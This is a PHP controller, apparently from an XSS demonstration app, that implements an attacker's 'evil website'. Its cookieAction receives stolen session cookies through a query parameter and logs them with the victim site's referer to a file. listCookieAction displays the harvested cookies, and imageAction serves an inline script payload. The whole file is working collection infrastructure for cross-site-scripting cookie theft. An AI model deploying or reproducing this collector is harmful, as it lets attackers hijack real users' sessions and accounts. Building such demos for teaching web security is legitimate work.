<?php

namespace App\Controller;

use FW\App\Controller;

class EvilController extends Controller
{
    private $cookieFile = __DIR__ . "/../../resources/tmp/cookie.txt";

    function indexAction()
    {
        $this->view->text('Welcome to my Evil Website');
    }

    function cookieAction()
    {
        $cookie = $this->request->get('c');
        $origin = $this->request->server('HTTP_REFERER');
        if (isset($cookie)) {
            if (!file_exists($this->cookieFile)) {
                touch($this->cookieFile);
            }
            $fh = fopen($this->cookieFile, 'a');
            fwrite($fh, PHP_EOL . json_encode(['time' => time(), 'origin' => $origin, 'cookie' => $cookie]));
            fclose($fh);
        }
        $this->response->text('You have been hacked!');
    }

    function listCookieAction()
    {
        $this->view->set('title', 'Evil WebSite');
        $lines = file($this->cookieFile);
        $cookies = [];
        foreach ($lines as $line) {
            $cookies[] = json_decode($line, true);
        }
        $this->view->set('cookies', $cookies);
        $this->view->html($this->view->render('fake/cookies-list'));
    }

    function imageAction()
    {
        $this->view->html('<script>alert(\'XSSed!\');</script>');
    }
}